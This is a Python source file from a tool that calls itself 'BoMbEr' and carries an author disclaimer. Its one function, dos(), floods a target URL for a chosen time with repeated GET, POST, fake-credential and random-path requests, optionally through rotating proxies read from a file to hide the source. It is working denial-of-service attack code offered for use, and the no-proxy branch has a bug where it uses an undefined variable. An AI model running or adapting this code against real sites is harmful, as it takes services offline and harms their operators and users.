# -*- coding: utf-8 -*-
#!/usr/bin/env python

"""
╔═════════════════════════════════════════════════════════════════════════════════╗
║                                                                                 ║
║                                      BoMbEr                                     ║
║  Author:                                                                        ║
║  https://github.com/ebankoff                                                    ║
║                                                                                 ║
║  The author of this program is not responsible for its use!                     ║
║  When posting this code on other resources, please indicate the author!         ║
║                                                                                 ║
║                               All rights reserved.                              ║
║                           Copyright (C) 2021 ebankoff                           ║
║                                                                                 ║
╚═════════════════════════════════════════════════════════════════════════════════╝
"""

#--------------------------------------(dos)--------------------------------------

import os
import sys
import time
import json
import emoji
import random
import shutil
import socket
import ctypes
import fnmatch
import smtplib
import os.path
import asyncio
import platform
import requests
import colorama
import datetime
import threading
import user_agent
import progressbar
from time import sleep
from threading import *
from sys import platform
from asyncio import sleep
from getpass import getpass
from os import name, system
from progress.bar import Bar
from threading import Thread
from functools import reduce
from bs4 import BeautifulSoup
from requests import get, post
from selenium import webdriver
from os.path import exists, isfile
from random import choice, randint
from bs4 import BeautifulSoup as bs
from selenium_stealth import stealth
from progress.spinner import Spinner
from selenium.webdriver.common.by import By
from colorama import Fore, Back, Style, init
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import StaleElementReferenceException

colorama.init()

def dos(url, tm, prx):
	lib = ['fdgjnhdoreoijdgf', 'regg343423', 'rrewfsfefgwerg', 'wejfsdv']
	header = {
		"Content-Type": "application/json"
	}
	payload = {}
	t = time.monotonic()
	if prx == 'yes':
		proxy = []
		with open(r"proxies.txt", "r", encoding="utf-8") as file:
			for line in file:
				proxy.append(line)

		proxy = [line.rstrip() for line in proxy]
		while time.monotonic() - t <= tm:
			try:
				proxies = {'http': 'http://' + random.choice(proxy), 'https': 'http://' + random.choice(proxy)}
				requests.get(url, proxies = proxies)
				requests.post(url, headers = header, json = payload, proxies = proxies)
				requests.get(url, auth=('username', 'fakepass'), proxies = proxies)
				requests.get(url + '/' + random.choice(lib), proxies = proxies)
			
			except:
				pass
	else:
		while time.monotonic() - t <= tm:
			try:
				requests.get(url, proxies = proxies)
				requests.post(url, headers = header, json = payload)
				requests.get(url, auth=('username', 'fakepass'))
				requests.get(url + '/' + random.choice(lib))
			
			except:
				pass